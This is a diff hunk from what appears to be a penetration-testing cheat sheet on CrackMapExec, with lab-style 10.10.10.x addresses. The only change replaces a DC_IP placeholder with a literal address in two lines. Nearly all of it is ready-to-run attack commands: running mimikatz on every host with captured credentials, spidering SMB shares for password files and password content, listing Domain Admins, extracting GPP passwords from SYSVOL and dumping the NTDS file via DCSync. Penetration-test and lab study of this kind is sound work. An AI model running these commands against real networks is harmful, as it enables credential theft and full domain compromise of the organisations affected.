@@ -110,8 +110,8 @@ Crackmapexec (https://www.youtube.com/watch?v=Dd4ZAm2mwwA)
   cme smb 10.10.10.125 -u username -p 'password' -M mimikatz (runs mimikatz on all hosts you have creds for)
     --otions to see module options
   cme smb 10.10.10.100-125 -u username -p 'password' --shares
-    - cme smb DC_IP -u username -p 'password' --spider sharename --pattern pass (searches for password files)
-    - cme smb DC_IP -u username -p 'password' --spider sharename --pattern pass --content (searches content for password)
+    - cme smb 10.10.10.110 -u username -p 'password' --spider sharename --pattern pass (searches for password files)
+    - cme smb 10.10.10.110 -u username -p 'password' --spider sharename --pattern pass --content (searches content for password)
   cme smb DC_IP -u username -p 'password' --groups 'Domain Admins' (displays all domain admins)
   cme smb DC_IP -u username -p 'password' -M gpp_password (searches DC SYSVOL for GPP passwords)
   cme smb DC_IP -u username -p 'password'  --ntds (grabs the NTDS file from the DC using DCSync)
